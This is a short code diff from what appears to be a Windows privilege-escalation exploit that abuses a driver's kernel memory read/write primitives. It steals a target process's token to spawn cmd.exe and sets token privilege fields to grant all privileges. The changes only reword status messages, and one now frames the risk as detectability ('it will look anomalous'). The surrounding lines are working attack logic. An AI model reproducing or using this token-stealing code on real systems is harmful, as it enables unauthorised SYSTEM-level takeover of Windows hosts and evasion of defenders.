@@ -43,7 +43,7 @@ bool tokenSteal(HANDLE hDriver, ULONGLONG iterProc, int targetPid) {
 	}
 
 	printf("[*] Stealing target process token and starting cmd.exe\n");
-	printf("[!] Note: If the targeted process closes while the token is still in use a BSOD will likely occur\n");
+	printf("[!] Note: A BSOD is likely if the target process closes while the token is in use\n");
 	write_qword(hDriver, curTokenPtr, targetToken);
 
 	system("start cmd.exe");
@@ -74,7 +74,7 @@ bool tokenEscalate(HANDLE hDriver, ULONGLONG iterProc, int targetPid) {
 		}
 	}
 
-	printf("[!] It is possible to set privilege fields to -1 to gain all privileges, but may cause instability\n");
+	printf("[!] It is possible to set privilege fields to -1 to gain all privileges, but it will look anomalous\n");
 	//ULONGLONG allprivs = 0xFFFFFFFFFF;
 	// Edit _SEP_TOKEN_PRIVILEGES and _SEP_AUDIT_POLICY to -1 to grant full privs
 	ULONGLONG SEPTOKEN = read_qword(hDriver, targetTokenPtr + 0x40);
